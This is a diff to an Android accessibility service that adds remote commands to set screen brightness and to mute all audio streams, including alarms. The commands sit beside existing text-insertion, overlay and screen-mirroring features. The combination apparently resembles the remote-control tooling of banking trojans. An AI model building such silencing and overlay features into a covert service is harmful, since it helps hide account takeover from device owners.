@@ -7,6 +7,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
 import android.content.Intent
+import android.media.AudioManager
 import android.graphics.Color
 import android.graphics.PixelFormat
 import android.graphics.Rect
@@ -81,6 +82,7 @@ class ControleGestosService : AccessibilityService() {
     private var logoOverlayAtual = ""
     private var ultimaEstruturaEspelho: String? = null
     private var filtroNotificacaoAnterior: Int? = null
+    private var modoSomAnterior: Int? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -1135,7 +1137,74 @@ class ControleGestosService : AccessibilityService() {
             "texto"   -> inserirTexto(partes.getOrNull(1) ?: "")
             "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
             "esconder_overlay"-> removerOverlay()
+            "brilho" -> definirBrilho(partes.getOrNull(1)?.toIntOrNull() ?: return)
+            "som" -> definirSom(partes.getOrNull(1) != "0")
+            "silenciar" -> definirSom(false)
+            "ativar_som" -> definirSom(true)
         }
+    }
+
+    private fun definirBrilho(percentual: Int) {
+        val valor = percentual.coerceIn(0, 100)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
+            Log.e("KL", "Sem permissao WRITE_SETTINGS para alterar brilho")
+            return
+        }
+
+        try {
+            Settings.System.putInt(
+                contentResolver,
+                Settings.System.SCREEN_BRIGHTNESS_MODE,
+                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+            )
+            val brilho = ((valor / 100f) * 255f).toInt().coerceIn(1, 255)
+            Settings.System.putInt(
+                contentResolver,
+                Settings.System.SCREEN_BRIGHTNESS,
+                brilho
+            )
+            Log.i("KL", "Brilho definido para $valor%")
+        } catch (e: Exception) {
+            Log.e("KL", "Erro ao definir brilho: ${e.message}")
+        }
+    }
+
+    private fun definirSom(ativo: Boolean) {
+        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        try {
+            if (!ativo) {
+                if (modoSomAnterior == null) {
+                    modoSomAnterior = audio.ringerMode
+                }
+                audio.ringerMode = AudioManager.RINGER_MODE_SILENT
+                silenciarStream(audio, AudioManager.STREAM_MUSIC)
+                silenciarStream(audio, AudioManager.STREAM_RING)
+                silenciarStream(audio, AudioManager.STREAM_NOTIFICATION)
+                silenciarStream(audio, AudioManager.STREAM_ALARM)
+                Log.i("KL", "Som desativado")
+            } else {
+                val restaurar = modoSomAnterior ?: AudioManager.RINGER_MODE_NORMAL
+                audio.ringerMode = restaurar
+                ativarStream(audio, AudioManager.STREAM_MUSIC)
+                ativarStream(audio, AudioManager.STREAM_RING)
+                ativarStream(audio, AudioManager.STREAM_NOTIFICATION)
+                ativarStream(audio, AudioManager.STREAM_ALARM)
+                modoSomAnterior = null
+                Log.i("KL", "Som ativado")
+            }
+        } catch (e: Exception) {
+            Log.e("KL", "Erro ao alterar som: ${e.message}")
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun silenciarStream(audio: AudioManager, stream: Int) {
+        audio.setStreamMute(stream, true)
+    }
+
+    @Suppress("DEPRECATION")
+    private fun ativarStream(audio: AudioManager, stream: Int) {
+        audio.setStreamMute(stream, false)
     }
 
     private fun executarToque(x: Float, y: Float) {
